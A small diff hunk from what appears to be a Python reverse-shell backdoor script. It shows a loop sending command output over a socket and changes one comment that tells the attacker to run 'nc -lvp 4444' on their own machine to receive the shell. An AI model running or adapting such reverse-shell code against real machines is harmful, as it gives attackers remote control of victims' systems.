@@ -17,4 +17,4 @@ while True:
     s.send(output)
 
 
-#On the Attacker's machine run "nc -lvp 4444" to listen and the backdoor will be #initiated
+#On the Attacker's machine run "nc -lvp 4444" to listen and the reverse shell will be #initiated
